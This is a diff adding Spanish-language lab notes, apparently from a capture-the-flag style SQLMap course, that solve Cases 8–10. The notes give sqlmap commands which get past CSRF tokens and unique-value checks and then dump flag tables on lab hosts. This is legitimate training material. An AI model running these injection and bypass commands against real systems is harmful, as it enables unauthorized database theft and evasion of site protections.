@@ -116,3 +116,45 @@ sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' --batch --search -C "style
 
 <figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
+## Advanced SQLMap Usage
+
+### Bypassing Web Application Protections
+
+#### Preguntas
+
+**What's the contents of table flag8? (Case #8)**
+
+Primero capturamos la petición.
+
+<figure><img src="../.gitbook/assets/image (1712).png" alt=""><figcaption></figcaption></figure>
+
+```
+sqlmap -r token.txt -p id --csrf-token="t0ken" \
+  --csrf-url="http://94.237.60.55:51043/case8.php" \
+  --random-agent --batch \
+  --search -T flag8
+```
+
+<figure><img src="../.gitbook/assets/image (1713).png" alt=""><figcaption></figcaption></figure>
+
+**What's the contents of table flag9? (Case #9)**
+
+Como se tiene un valor único hay que poner el parámetro `--randomize='uid'`
+
+<figure><img src="../.gitbook/assets/image (1714).png" alt=""><figcaption></figcaption></figure>
+
+```
+sqlmap -u "http://94.237.60.55:51043/case9.php?id=1&uid=2560757563" \
+  -p id \
+  --batch \
+  --random-agent \
+  --randomize=uid \
+  -T flag9 --dump --no-cast
+```
+
+<figure><img src="../.gitbook/assets/image (1715).png" alt=""><figcaption></figcaption></figure>
+
+**What's the contents of table flag10? (Case #10)**
+
+Parece ignorar cualquier solicitud http enviada a través de sqlmap. Así que para eludir esto, usaremos un agente aleatorio.
+
